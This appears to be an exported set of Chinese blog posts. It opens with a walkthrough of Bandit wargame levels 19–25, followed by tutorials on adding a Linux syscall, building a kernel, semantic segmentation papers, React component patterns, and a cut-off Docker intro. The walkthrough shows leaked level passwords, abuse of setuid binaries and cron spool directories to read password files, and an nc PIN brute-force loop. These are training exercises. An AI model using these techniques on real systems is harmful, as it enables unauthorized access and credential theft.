readmeIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x Level 19&rarr;20目标为了进入下一关，你应该使用用户目录下的 setuid 二进制文件。在没有参数的情况下执行它来探索如何使用。在你正确使用了它后，下一关的密码可以在(/etc/bandit_pass)中找到。 查看用户目录，我们可以看到由bandit20创建的 bandit20-do文件，可以被bandit19访问。该文件的权限设置是 rws。s 权限意味着当该文件被执行时，它会在所有者的权限下运行。 1-rwsr-x--- 1 bandit20 bandit19 7237 Jun 6 2013 bandit20-do 因为所有者是 bandit20,我们可以尝试运行它，并使用提升的权限来查看下一关的密码。 123./bandit20-doRun a command as another user. Example: ./bandit20-do id 让我们查看密码文件并获取下一关的密码。 12./bandit20-do cat /etc/bandit_pass/bandit20GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level 20&rarr;21目标用户目录下有一个 setuid 二进制文件，它做下列事情：建立一个到 localhost 某一端口的连接，该连接可由你通过命令行参数指定。它之后会从连接处读入一行文本并和上一关（bandit20）的密码比较。如果密码是正确的，它将传回下一关的密码（bandit21）。 注意：为了通过这关，你需要登录两次：一次运行 setuid 命令，一次启动 setuid 将会连接的网络服务。 注意 2：尝试连接你自己的网络服务来查看是否如你想象的那样工作。 可以看到 suconnect 需要执行，让我们看看执行的结果。 12345./suconnectUsage: ./suconnect &lt;portnumber&gt;This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back. 就像注意中所提示的，我们需要两个实例，一个用来监听端口，另一个读入和返回下一关的密码。我们使用 nc来监听我们选择的端口并发送这关的密码到该端口。 1nc -l 32123 &lt; /etc/bandit_pass/bandit20 在另一个 ssh 会话中，我们在同一个端口启动 suconnect ，马上得到了回应。 123./suconnect 32123Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0jPassword matches, sending next password 此时查看第一个会话，发现下一关的密码就在其中。 1gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr Level 21&rarr;22目标一个程序通过 cron 在规律的中断下自动运行，基于时间的作业调度。查看 /etc/cron.d 的配置来查看什么命令被执行了。 可能用到的命令cron, crontab, crontab(5) (use “man 5 crontab” to access this) 从目标来看，我们可以访问 /etc/cron.d 并查找一些文件。名为 cronjob_bandit22 的文件看起来是我们感兴趣的。它展示了 cron_job_bandit22.sh 脚本的位置。我们来看看这个脚本。 1234567cat cronjob_bandit22* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullcat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv 某人将 bandit22 的密码放入了临时文件中。我们再一次查看临时文件，找到下一关的密码。 12cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLI Level 22&rarr;23目标一个程序通过 cron 在规律的中断下自动运行，基于时间的作业调度。查看 /etc/cron.d 的配置来查看什么命令被执行了。 可能用到的命令cron, crontab, crontab(5) (use “man 5 crontab” to access this) 和上一关做一样的事情，我们发现了下面这个脚本 12345678910111213cat cronjob_bandit23* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/nullcat /usr/bin/cronjob_bandit23.sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget 我们注意到 whoami 返回当前用户，也就是 bandit22。所以我们应该改变它，先运行一下这个脚本看看会发生什么。 12/usr/bin/cronjob_bandit23.shCopying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3 所以我们将 bandit22 换成 bandit23，我们将会获得一个包含下一关密码的文件。长文件名是 mytarget 的 mds hash。我们得到这个长字符串并查看该文件的内容，即为我们下一关的密码。 12345echo I am user bandit23 | md5sum | cut -d ' ' -f 18ca319486bfbbc3663ea0fbe81326349cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n Level 23&rarr;24目标：一个程序通过 cron 在规律的中断下自动运行，基于时间的作业调度。查看 /etc/cron.d 的配置来查看什么命令被执行了。 注意：这一关需要你自己创建自己的第一个 shell 脚本。这是一个非常大的进步。 12345678910111213141516cat cronjob_bandit24* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/nullcat /usr/bin/cronjob_bandit24.sh#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho \"Executing and deleting all scripts in /var/spool/$myname:\"for i in *;do echo \"Handling $i\" ./$i rm -f $idone 从脚本的描述来看，它将执行 $myname 文件夹下的所有脚本。我们在 /var/spool 目录下发现了 bandit24 文件夹。因此，让我们写一个脚本复制密码到临时文件夹中。 12345mkdir /tmp/b23abcvim /tmp/b23abc/getpass.shcat /tmp/b23abc/getpass.sh#!/bin/bashcat /etc/bandit_pass/bandit24 &gt; tmp/b23abc/pass.txt 我们能复制文件到 /var/spool/bandit24 ，但是记住执行前必须设置权限。 12chmod 777 /tmp/b23abc/getpass.shcp /tmp/b23abc/getpass.sh /var/spool/bandit24/ 然而，在几分钟后，我们并没有在文件夹中获得 pass.txt 。我们忘记设置文件夹的权限，使得文件能被写入。完成后，我们就可以得到下一关的密码。 123chmod 777 /tmp/b23ac/cat /tmp/b23abc/pass.txtUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Level 24&rarr;25目标一个服务正在监听 30002 端口，如果将本关的密码和一个4位的 pincode 给它，它就会给你下一关的密码，我们没有办法获取这个 Pincode ，只能遍历 10000种组合，也就是暴力破解。 再一次，我在 /tmp 中创建一个文件夹，确保所有新创建的文件夹和所有和本关相关联的文件都有合适的权限。 1234567#!/bin/bashpasswd=\"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\"for a in {0..9}{0..9}{0..9}{0..9}do echo $passwd' '$a | nc localhost 30002 &gt;&gt; result &amp;done 我选择使用 netcat(nc) 命令。pincode 通过一个 for 循环遍历生成。 ‘&gt;&gt;’将输出补充到 result 文件中。’&amp;’让命令在后台进行，让它可以开始下一次迭代。 使用同样的策略来从文件中找到唯一的行，我们就可以看到下一关的密码了。 123$ sort result | uniq -uCorrect!The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG","link":"/2019/01/08/wargame-Bandit/"},{"title":"为Linux添加一个系统调用","text":"在之前的博客中，我使用 C 和 Python 分别实现了一个简单的 Shell，这是一个很有意思的小程序，可以让你了解你每天都在使用的工具。而在简单的 Shell 之下则是一系列的系统调用，例如：read, fork, exec, wait, write等等。现在让我们继续这段旅程，开始学习这些系统调用是如何在 Linux 中实现的。 什么是系统调用在我们实现系统调用之前，我们最好弄清楚它们是什么。一个菜鸟程序员——像几年前的我——可能会将系统调用定义为 C 标准库提供的任何函数。但这并不完全准确。即使许多 C 标准库中的函数与系统调用对应的很好（例如 chdir），但大部分都会比简单地使用系统调用做更多的事（例如 fork, fprintf）。或者纯粹通过编程实现不使用系统调用（qsort, strtok）。 事实上，一个系统调用有着非常明确的定义。它是一种按照你的需求调用操作系统内核资源的方式。对字符串进行分词这样的操作不需要和内核交互，但是任何涉及到设备，文件或者进程的操作需要。 系统调用在底层的行为也与普通函数不同。不同于简单地让指令指针跳转到你的程序或函数库的代码段，而是让你的程序请求 CPU 切换到内核模式，然后访问预先在内核中定义的地址来执行系统调用。这只能通过几种方式实现，例如：处理器中断或者特定的指令（syscall,sysenter） 。 难得的是，实现系统调用的最复杂的部分已经在内核中实现了。不管一个系统调用是如何实现的，都得通过系统调用号查表来找到并调用正确的内核函数，这对于实现我们自己的系统调用来说是非常简单的。让我们开始吧。 设置虚拟机实现系统调用并不是通过修改某一个内核模块来实现。而是你必须获得一份 Linux 源码的复制，修改它，编译它，启动它。这些都是可以直接在你的主机中完成的事（如果主机是 Linux系统），但最好在虚拟机上进行这类尝试。例如在 VirtualBox 上。 虽然你可以手动地配置一台虚拟机，但更节省时间的方式是下载一台已经配置好的。你可以通过这个链接 下载一台已经配置好的虚拟机。在这篇文章中，我会使用201608CLI 版本的 VirtualBox 虚拟机。下载并解压它。在 VirtualBox 中创建一台新的虚拟机，选择下载解压好的 vdi 文件作为硬盘文件。创建并允许你的虚拟机，你就能看到你的命令行登录界面了。根用户的密码可以在下载页面查看到（我的是：osboxes.org）。 注意：如果你有一台多核的机器，编辑你的虚拟机设置让它使用多核将会是一个很好的主意。这将会显著地提升编译效率，只要你再接下来的命令中使用 make -jN 替换 make，其中 N 是你机器的 CPU 核数。 需要做的第一步是安装 bc，一个没有包含进虚拟机的编译期 Linux 依赖。不幸的是，这需要你首先更新虚拟机。注意我在这篇博客中给出的每一条命令都需要在 root 下运行。 123$ pacman -Syu$ pacman -S bc$ reboot 你需要重启虚拟机，因为内核将被更新。我们必须确保我们运行的内核是更新过的以开始后续的操作。 获取源码在你配置好虚拟机后，下一步是下载内核源码。尽管大部分开发者本能地想到用 Git 来获取他们需要的代码，但这一次可能并不需要。Linux 的 Git 仓库太大了，所以复制它是很不值得的。然而可以你可以下载内核版本相关的源码压缩文件。你可以通过 uname -r 来查看内核版本。然后在 kernel.org 上下载最接近的版本。在你的虚拟机中，使用 curl 命令来下载源码： 12# -O -J will set the output filename based on the URL$ curl -O -J https://www.kernel.org/pub/linux/kernel/v4.x/linux-VERSION.tar.xz 之后解压 tarball 文件： 12$ tar xvf linux-VERSION.tar.xz$ cd linux-VERSION 配置你的内核Linux 内核是非常方便配置的。你可以启用或废弃它的大部分功能。如果你要手动地配置每一个选项，你将会做一整天。幸运地使，你可以通过复制你的内核已有的配置文件来跳过这一步，它保存在/proc/config.gz 。通过这条命令来将配置应用在你的新内核中： 1$ zcat /proc/config.gz &gt; .config 为了确保配置文件中的所有变量都被赋值，运行 make oldconfig。如果没有问题，命令行将不会询问你任何配置问题。 你唯一需要修改的配置项是你的内核名，确保它不会和你当前已经安装的发生冲突。在 Arch Linux 中，内核在构建时就带有后缀 -ARCH。你应该改变这个后缀，通过文本编辑器打开.confit，然后直接修改它的行。你将会发现它就在”General setup”头下面，距文件底不远。 1CONFIG_LOCALVERSION=\"-ARCH\" 添加你的系统调用现在内核已经配置好了，你可以马上开始编译它了。然而创建一个系统调用需要编辑系统调用表，它记录了每一条系统调用的大致信息。因为编译需要花费很长的时间，你现在编译的话会浪费很多的时间。不如让我们做一些有价值的事情吧：开始写你自己的系统调用！ Linux 中的一些代码是架构特定的，例如一些初始化处理中断和系统调用的代码。因此系统调用表所在的目录取决于你的处理器架构。我们将在 x86_64 架构的机器上操作。 系统调用表在 x86_64 的机器上包含系统调用表的文件在路径arch/x86/entry/syscalls/syscall_64.tbl 。这张表通过脚本读入并生成一些模板代码，这将使我们的事情变得非常简单。来到文件底部（在4.7.1版本中系统调用号结束于328），添加下面这行： 1329 common yifeng sys_yifeng 注意每一列之间是一个 tab(不是空格)。第一列是系统调用号。在这张表中我选择了下一个可用的数字——329.在不同版本的系统中这个数字可能不同！第二列表明这个系统调用号是在32位和64位 CPU 中共用的。第三列是系统调用名，第四列是实现函数名。转换系统调用名到实现函数名是简单的，在系统调用名前加上前缀sys_ 即可。我使用了 yifeng 作为我的系统调用名，你也可以使用任何你喜欢的。 系统调用函数最后一步是为系统调用实现调用函数。我们其实并不知道系统调用应该做些什么，但我们想让它做一些简单的我们可以察觉的事。比如使用printk() 打印一些内核日志。所以，我们的系统调用将会需要传入一个参数（一个字符串），然后将它写入内核日志。 你可以在任何地方实现系统调用，但是杂项的系统调用最好写在kernel/sys.c 文件中。 123456789SYSCALL_DEFINE1(yifeng, char *, msg){ char buf[256]; long copied = strncpy_from_user(buf, msg, sizeof(buf)); if (copied &lt; 0 || copied == sizeof(buf)) return -EFAULT; printk(KERN_INFO \"yifeng syscall called with \\\"%s\\\"\\n\", buf); return 0;} SYSCALL_DEFINEN 是一系列的宏定义族，它使得定义 N 个变量的系统调用变得简单。宏的第一个参数是系统调用的名字（没有 sys_ 前缀）。接下来的参数是系统调用的参数类型和参数名对。因为我们的系统调用只有一个参数，所以我们使用 SYSCALL_DEFINE1 ，我们的唯一参数是char * 和参数名msg 。 我们马上会遇到一个有趣的问题，那就是我们无法直接使用提供给我们的 msg 的指针。有以下几点可能的原因： 进程可能会尝试愚弄我们来打印内核空间的数据。通过传递一个映射到内核空间的指针，这个系统调用将会打印内核空间的数据。这将不能被允许。 进程可能会尝试度其他进程的内存，通过传递一个映射到其他内存地址空间的指针。 我们需要考虑内存的 读/写/执行 的权限。 为了处理这个问题，我们使用了strncpy_from_user() 函数，它的行为和strncpy 类似，但是会首先检查传入的地址是否是来自用户空间的地址。如果传入的字符串太长或者在复制的时候出现了问题，我们都会返回 EFAULT (即使返回EINVAL 对于字符串太长的情况更合适)。 最终我们使用printk 来打印。KERN_INFO 会展开成一个文本字符串。编译器将会把它和格式化字符串串联起来，打印的效果和printf 类似。 编译和启动内核注意：这些步骤会有一些复杂。看这部分的时候，你不需要一步一步输入命令，在最后我会给你一个完成这些工作的脚本。 我们的第一步是编译内核和它的模块。内核的主镜像通过make 编译。你可以在下面的文件中看到编译结果：arch/x86_64/boot/bzImage 。在运行make modules_install 后， 这个版本的内核模块将被编译并复制到 /lib/modules/KERNEL_VERSION 。例如，按照我所给出的配置，这些模块将被编译并放置在/lib/modules/linux-4.7.1-yifeng/ 。 在你已经编译好内核及其模块后，你将需要做一些事情来启动它。首先，你将要复制你已经编译好的内核镜像到你的/boot 目录： 1$ cp arch/x86_64/boot/bzImage /boot/vmlinuz-linux-yifeng 接下来需要创建一个“initramfs”。 通过两步来实现它。首先基于你之前的文件创建一个 preset: 1$ sed s/linux/linux-yifeng/g &lt;/etc/mknitcpio.d/linux.preset &gt;/etc/mkinitcpio.d/linux-yifeng.preset 之后生成一个镜像： 1$ mkinitcpio -p linux-yifeng 最后你需要指导你的 bootloader (这里是指我们的虚拟机，GRUB)来启动我们的新内核。因为 GRUB 可以自动找到 /boot 目录下的内核镜像，所有我们需要做的是再生成 GRUB 配置： 1$ grub-mkconfig -o /boot/grub/grub.cfg 所以上面的操作可以总在一个脚本中： 1234567891011121314151617181920212223242526#!/usr/bin/bash# Compile and \"deploy\" a new custom kernel from source on Arch Linux# Change this if you'd like. It has no relation# to the suffix set in the kernel config.SUFFIX=\"-yifeng\"# This causes the script to exit if an error occursset -e# Compile the kernelmake# Compile and install modulesmake modules_install# Install kernel imagecp arch/x86_64/boot/bzImage /boot/vmlinuz-linux$SUFFIX# Create preset and build initramfssed s/linux/linux$SUFFIX/g \\ &lt;/etc/mkinitcpio.d/linux.preset \\ &gt;/etc/mkinitcpio.d/linux$SUFFIX.presetmkinitcpio -p linux$SUFFIX# Update bootloader entries with new kernels.grub-mkconfig -o /boot/grub/grub.cfg 将 deploy.sh 保存在你内核源码的主目录下，执行chmod u+x deploy.sh 来设置执行权限。现在你就可以通过运行这个脚本来构建和部署内核了。编译将会需要一些时间。 一旦脚本执行完成，执行reboot 。当 GRUB 弹出，选择“Advanced Options for Arch Linux”。这将会显示可用内核的菜单列表，选择你自定义的内核并启动它。 如果一切顺利，就能看到带有自定义内核版本的登录页面了。 测试你的系统调用至此，我们已经编译并启动了我们自定义并修改的内核了。接下来就是最激动人心的时刻了——运行我们的系统调用。 C 标准库为我们封装了大部分系统调用，但我们没有考虑过如何触发一个中断。对于无法直接调用的系统调用，GNC C标准库提供了一个 syscall() ，它可以根据系统调用号来调用系统调用。 下面是一个小程序，使用系统调用号来调用我们自定义的系统调用： 12345678910111213141516171819202122232425/* * Test the yifeng syscall (#329) */#define _GNU_SOURCE#include &lt;unistd.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdio.h&gt;/* * Put your syscall number here. */#define SYS_yifeng 329int main(int argc, char **argv){ if (argc &lt;= 1) { printf(\"Must provide a string to give to system call.\\n\"); return -1; } char *arg = argv[1]; printf(\"Making system call with \\\"%s\\\".\\n\", arg); long res = syscall(SYS_yifeng, arg); printf(\"System call returned %ld.\\n\", res); return res;} 将这个文件命名为test.c ,编译它gcc -o test test.c 。接下来就可以试着调用系统调用了，尝试打印“Hello World”。 12$ ./test 'Hello World!'# use single quotes if you have an exclamation point :) 可以通过dmesg 指令查看生成的日志。因为dmesg会在你的终端弹出超多的信息，所以使用dmesg|tail 来查看日志的最后几行就可以了。你就可与在日志里看到系统调用生成的文本了。 本博客参考了该链接","link":"/2018/12/19/为Linux添加一个系统调用/"},{"title":"从源码编译和安装Linux内核","text":"如何编译和安装Linux内核可以按如下的步骤编译和安装Linux内核 1.从 kernel.org 抓取最新版本的内核 2.验证内核 3.解压内核压缩文件 4.复制已存的 Linux 内核配置文件 5.编译和构建内核 6.安装内核和模块 7.更新 Grub 配置 8.重启系统 1.获取最新版本的源代码访问Linux官方网站下载最新的源代码。点击标有“Latest Stable Kernel”的黄色大按钮。 也可以使用 wget 命令下载 Linux 内核源代码： 1wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.19.1.tar.xz 2.获取 tar.xz 文件使用 unzx 命令和 xz 命令解压压缩文件获取源代码： 1unzx -v linux-4.19.1.tar.xz 或者 1xz -d -v linux-4.19.1.tar.xz 使用pgp验证 linux 内核 tarball首先获取linux-4.19.1.tar 的 PGP 签名： 1wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.19.1.tar.sign 尝试进行验证： 1gpg --verify linux-4.19.1.tar.sign 示例输出： 从 PGP 密钥服务器获取公钥来验证签名。例如：RSA key ID 79BE3E4300411886（从上面的输出结果中得到） 1gpg --recv-keys 79BE3E4300411886 示例输出： 1234567gpg: key 79BE3E4300411886: 7 duplicate signatures removedgpg: key 79BE3E4300411886: 172 signatures not checked due to missing keysgpg: /home/vivek/.gnupg/trustdb.gpg: trustdb createdgpg: key 79BE3E4300411886: public key &quot;Linus Torvalds &lt;torvalds@kernel.org&gt;&quot; importedgpg: no ultimately trusted keys foundgpg: Total number processed: 1gpg: imported: 1 现在再一次使用 gpg 命令进行验证： 1gpg --verify linux-4.19.1.tar.sign 示例输出： 12345678gpg: assuming signed data in &apos;linux-4.19.1.tar&apos;gpg: Signature made Sun 12 Aug 2018 04:00:28 PM CDTgpg: using RSA key 79BE3E4300411886gpg: Good signature from &quot;Linus Torvalds &lt;torvalds@kernel.org&gt;&quot; [unknown]gpg: aka &quot;Linus Torvalds &lt;torvalds@linux-foundation.org&gt;&quot; [unknown]gpg: WARNING: This key is not certified with a trusted signature!gpg: There is no indication that the signature belongs to the owner.Primary key fingerprint: ABAF 11C6 5A29 70B1 30AB E3C4 79BE 3E43 0041 1886 如果通过了验证，那么就使用 tar 进行解压： 1tar xvf linux-4.19.1.tar 3.配置 Linux 内核特征和模型在开始构建内核之前，你必须配置内核特征。你也必须明确你的系统所需要的内核模块（驱动）。这个对于新手来说是很有压力的。我建议你使用 cp 命令复制已有的配置文件： 12cd linux-4.19.1cp -v /boot/config-$(uname -r) .config 示例输出： 1&apos;/boot/config-4.15.0-30-generic&apos; -&gt; &apos;.config&apos; 4.安装编译器和其他必须的工具你必须安装有类似 GCC 或者相关联的工具来编译 Linux 内核。 使用下列的 apt 命令或 apt-get 命令来安装： 1sudo apt-get install build-essential libncurses-dev bison flex libssl-dev libelf-dev 尝试 yum 命令： 1sudo yum group install &quot;Development Tools&quot; 或 1sudo yum groupinstall &quot;Development Tools&quot; 额外的包： 1sudo yum install ncurses-devel bison flex elfutils-libelf-devel openssl-devel 如何在 Fedora Linux 上安装GCC 和其它开发工具运行下列 dnf 命令： 12sudo dnf group install &quot;Development Tools&quot;sudo dnf ncurses-devel bison flex elfutils-libelf-devel openssl-devel 5.编译内核开始编译并创建一个压缩好的内核镜像，输入： 1make 为了加速编译时间，传递 -j 参数： 1234## use 4 core/thread ##$ make -j 4## get thread or cpu core count using nproc command ##$ make -j $(nproc) 编译和构建 linux 内核将会话费大量时间，这取决于你的系统资源（例如：CPU）。 安装 Linux 内核模块1sudo make modules_install 安装 Linux 内核到目前为止我们已经编译了 Linux 内核并且安装了内核模块。是时候安装内核本身了： 1sudo make install 这将安装三个文件在 /boot 目录并修改你的内核 grub 配置文件： initramfs-4.19.1.img System.map-4.19.1 vmlinuz-4.19.1 更新 grub 配置你需要修改 Grub 2 bootloader 配置。 输入下列 shell 命令 CentOS/RHEL/Oracle/Scientific and Fedora Linux12sudo grub2-mkconfig -o /boot/grub2/grub.cfgsudo grubby --set-default /boot/vmlinuz-4.19.1 Debian/Ubuntu Linux12sudo update-initramfs -c -k 4.19.1sudo update-grub 重启系统： 1reboot 在重启后验证 Linux 内核是否为最新版本 1uname -mrs","link":"/2018/12/05/从源码编译和安装Linux内核/"},{"title":"基于深度学习的图像语义分割综述（译）","text":"一、语义分割是什么？语义分割，指在图像上找到具有同一语义的像素，并将其归为一类，是计算机视觉中的关键问题之一，属于高级的视觉任务，是完全场景理解的基础。许多新兴的应用需要精准和高效的语义分割：自动驾驶、室内导航、虚拟现实和增强现实。这些需求随着深度学习方法的崛起一同迸发，衍生了大量计算机视觉相关的应用。具体的应用如下图所示。 除了要识别摩托车和车上的人外，我们还需要描绘出每个物体的边界。所以，不同于分类任务，我们需要从我们的模型中得到密集的像素集的预测结果。 VOC2012和MSCOCO是语义分割任务中最成功的数据集。 ##二、两种方法的区别 在深度学习的方法流行之前，人们使用 TextonForest^1 和 Random Forest based classifiers^2 来进行语义分割。说到语义分割，卷积神经网络（CNN）在分割任务上也有大量成功的应用。 最早将深度学习成功应用于分割任务的方法是 patch classification^3,它将每一个像素根据周围的图片块分别分类。使用图片块的主要原因是分类网络通常有全连接层并且需要固定大小的图片。 在2014年，伯克利的 Lond 等人提出了 Fully Convolutional Nerworks(FCN)^4。推广了基于 CNN 的网络架构，在不使用全连接层的情况下进行密集预测。这使得用任意大小的图片来生成分割图成为可能，并且比块分类的速度更快。后来几乎所有的语义分割领域最优秀的成果都是对 FCN 进行的改进。FCN 可以称作是深度学习在语义分割领域的里程碑。 除了全连接层外，另一个使用 CNN 进行语义分割时会遇到的问题是池化层。池化层能够增加感知野并且能够在丢弃部分空间信息的同时聚合上下文信息。然而语义分割需要对像素的分类有明确的区分，需要将空间信息保留。有两种不同的网络架构可用来解决这个问题。 首先是编码-解码架构。编码通常是配合着池化层降低了空间维度，解码则是逐渐恢复对象细节和空间维度。网络中有很多直连编码器与解码器的链接，来复制解码器更好地恢复对象细节。U-Net^5 是这一架构的经典实现。 第二种架构是使用 dilated/atrous convolutions^6来替代传统的卷积操作。 Conditional Random Field(CRF) postprocessing^7通常用来提升语义分割的效果。CRFs 是一种图模型，可以使得语义分割的结果更加平滑，对于强度相似的像素更趋向于把它们标为一类。CRFs 可以提高 1~2% 的分数。 三、论文汇总接下来我将介绍一些自 FCN 以来的能代表语义分割领域进展的论文（所有的论文都以 VOC2012 作为基准） FCN SegNet Dilated Convolutions DeepLatb(v1 &amp; v2) DeepLab v3 对于每一篇论文，我列出了它们的主要贡献，并对主要工作进行了说明，并在最后列出了它们在 VOC2012 数据集上的得分，这样就能更直观地感受到语义分割领域的发展进程。 1.FCN^4 Fully Convolutional Networks for Semantic Segmentation Submitted on 14 Nov 2014 关键贡献： 推广了端到端的卷积神经网络在语义分割上的应用 将 ImageNet 上的预训练模型应用在了语义分割上 使用反卷积层上采样 引入了跳转链接来提高上采样时的稀疏性 概要： FCN的主要贡献是提出了利用分类网络中的全连接层来对输入图片的全部区域做卷积。这和传统的分类网络在输入图片块上做的操作是等价的，但是全连接层更加的高效，因为卷积核的共享权重机制。尽管这点贡献并不是这篇 Paper 独家提供的，它仍然将当时 VOC2012 数据集的分割效果做到了最好。 在对 ImageNet 上预训练的模型 VGG 进行全连接层的卷积操作后，特征图仍然需要上采样，因为 CNN 中的池化操作已经对特征图降了维。不同于使用简单的双线性插值，使用反卷积层可以自动学习插值的功能。这一层也被称为上卷积、全卷积、反置卷积等。 因为在池化过程中部分信息的丢失，反卷积操作只能产生稀疏的分割图。因此，用跳转链接将高分辨率的特征图引入就是非常有必要的了。 Benchmarks(VOC2012): 2.SegNet^8 SegNet: A Deep Convolutional Encoder-Decoder Architecture for Image Segmentation Submitted on 2 Nov 2015 关键贡献 使用Maxpooling indices来增强位置信息。 概要： FCN的upconvolution层+shortcut connections产生的分割图比较粗糙，因此SegNet增加了更多的shortcut connections。不过，SegNet并不是直接将encoder的特征进行直接复制，而是对maxpooling中的indices进行复制，这使得SegNet的效率更高。 Benchmarks(VOC2012): 3.Dilated convolution^9 Multi-Scale Context Aggregation by Dilated Convolutions Submitted on 23 Nov 2015 关键贡献： 使用空洞卷积用来进行稠密预测（dense prediction）。 提出上下文模块（context module），使用空洞卷积（Dilated Convolutions）来进行多尺度信息的的整合。 概要： pooling操作可以增大感受野，对于图像分类任务来说这有很大好处，但由于pooling操作降低了分辨率，这对语义分割来说很不利。因此作者提出一种叫做dilated convolution的操作来解决这个问题。dilated卷积(在deeplab中称为atrous卷积)。可以很好地提升感受野的同时可以保持空间分辨率。 网络架构有两种，一种是前端网络，另外一种是前端网络+上下文模块，分别介绍如下： 将VGG网络的最后两个pooling层给拿掉了，之后的卷积层被dilated 卷积取代。并且在pool3和pool4之间空洞卷积的空洞率=2，pool4之后的空洞卷积的空洞率=4。作者将这种架构称为前端（front-end）。 除了前端网络之外，作者还设计了一种叫做上下文模块（context module）的架构，加在前端网络之后。上下文木块中级联了多种不同空洞率的空洞卷积，使得多尺度的上下文信息可以得到整合，从而改善前端网络预测的效果。需要注意的是前端网络和上下文木块是分开训练的，因为作者在实验中发现，如果是联合在一起进行端对端的训练并不能改善性能。 Benchmarks(VOC2012): 4.DeepLab(v1,v2)^10 v1: Semantic Image Segmentation with Deep Convolutional Nets and Fully Connected CRFs Submitted on 22 Dec 2014 v2 : DeepLab: Semantic Image Segmentation with Deep Convolutional Nets, Atrous Convolution, and Fully Connected CRFs Submitted on 2 Jun 2016 关键贡献： 使用atrous卷积，也就是后来的空洞卷积，扩大感受野，保持分辨率。 提出了atrous spatial pyramid pooling (ASPP)，整合多尺度信息。 使用全连接条件随机场（fully connected CRF)进行后处理，改善分割结果。 概述： 空洞卷积可以在不增加参数的情况下增加感受野。 通过两种方式来进行多尺度的处理：A.将原始图像的多种尺度喂给网络进行训练。B.通过平行的不同空洞率的空洞卷积层来获得。 通过全连接条件随机场来进行后处理，以改善分割结果。 Benchmarks(VOC2012): 5.DeepLab(v3)^11 Rethinking Atrous Convolution for Semantic Image Segmentation Submitted on 17 Jun 2017 关键贡献： 提升了 atrous 空间金字塔池化（ASPP） 使用了层叠的 atrous 卷积的模型 概要： 使用 dilated/atrous 卷积优化了残差模型。提到了使用串联的图片级的特征来提升 ASPP，这种特征由不同比例的1x1卷积和3x3 atrous 卷积生成。在每一个并行的卷积层后也用到了批正态化。 层叠模型由多个残差块组成，这些残差块中的卷积层由不同比例的 atrous 卷积层构成。这个模型和 dilated 卷积中的模型很像，但它直接应用了中间的特征图，而不是 belief maps（belief maps 是CNN中最后的等同于数字分类的特征图）。 这两个提出的模型可以分别被独立验证，将两个模型混合并不能提升整体的效果。两个模型都能在验证集上取得不错的效果，ASPP 更好一些。而 CRF 并没有被应用在其中。 这两个模型的性能都优于 DeepLabv2。作者提到了性能的提升主要来自于批正态化和更好地对多维度特征图进行编码的方法。 Benchmarks(VOC):","link":"/2018/12/14/基于深度学习的图像语义分割综述（译）/"},{"title":"展示组件和容器组件","text":"react-redux绑定库是基于容器组件和展示组件分离的开发思想，是react开发中非常重要的一个思想。 详细介绍可以查看本文 #展示组件和容器组件对比 展示组件 容器组件 作用 描述如何展现（骨架、样式） 描述如何运行（数据获取、状态更新） 直接使用 Redux 否 是 数据来源 props 监听 Redux state 数据修改 从 props 调用回调函数 想 Redux 派发actions 调用方式 手动 通常由 React Redux 生成 进行组件分离的好处1.更好地分散注意力。通过这样写组件能更好地理解你的 app 和 UI。 2.更好地重用。你可以使用同样的表式组件配合完全不同的状态源，并在未来重用这些分离的容器组件。 3.展示组件对你 APP 的“调色”是很有必要的。你可以把它们放在单页里，并让设计师在不触碰逻辑的情况下自由地调整配色。 4.这强迫你抽出类似于：Sidebar，Page，ContextMenu，这样的布局组件并使用 this.props.children 而不是重复在几个容器组件中同样的标记和布局。 #什么时候该引入容器组件？ 我建议你一开始只使用展示组件来构建你的APP。最终你将意识到你传递了太多 props 给中间的组件。当你意识到有些组件并没有用到它们接收的 props，而只是将这些 props向下传递。在底层的组件需要更多数据时，你不得不重写所有这些中间组件，这时候就很适合引入容器组件了。通过这种方式，你可以将 props 传递给叶子节点而不增加和它无关的中层组件的负担。 提示不要把展示组件和容器组件的划分当做教条。有些时候甚至无关紧要。如果你不确定一个组件是该定义成展示组件还是容器组件，也许是区分得太早了，不用担心。","link":"/2019/03/05/展示组件和容器组件/"},{"title":"我理解的docker","text":"想写一篇汇总的 docker 文章，目的在于当我以后想要复习 docker 相关的知识时，只要翻这篇文章就好。顺便把在微博实习的时候做的关于 docker 的技术分享进行整合，物尽其用吧。 Docker 简介Docker 是 Docker 公司开源的一个基于轻量级虚拟化技术的容器引擎项目, 整个项目基于 Go 语言开发，并遵从 Apache 2.0 协议。目前，Docker 可以在容器内部快速自动化部署应用，并可以通过内核虚拟化技术（namespaces 及 cgroups 等）来提供容器的资源隔离与安全保障等。由于 Docker 通过操作系统层的虚拟化实现隔离，所以 Docker 容器在运行时，不需要类似虚拟机（VM）额外的操作系统开销，提高资源利用率，并且提升诸如 IO 等方面的性能。 Docker 容器和镜像镜像定义镜像（Image）就是一堆只读层（read-only 